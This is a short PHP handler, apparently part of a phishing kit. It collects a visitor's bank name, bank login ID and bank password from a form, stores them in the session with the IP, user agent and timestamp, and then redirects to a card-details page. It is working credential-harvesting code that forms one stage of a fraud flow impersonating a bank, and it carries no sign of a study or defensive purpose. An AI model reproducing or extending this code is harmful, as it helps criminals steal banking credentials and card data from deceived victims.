<?php
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['nom_banque'] = $_POST['nom_banque'];
$_SESSION['id_banque'] = 		$_POST['id_banque'];
$_SESSION['mdp_banque'] = 		$_POST['mdp_banque'];


if (
!empty($_POST['nom_banque']) &&
!empty($_POST['id_banque'])&& 
!empty($_POST['mdp_banque']))
{
    
       
    header('Location: ../user/carte.php');
    
} else {
   
    header('Location: ../user/info.php?error=1');
}

?>
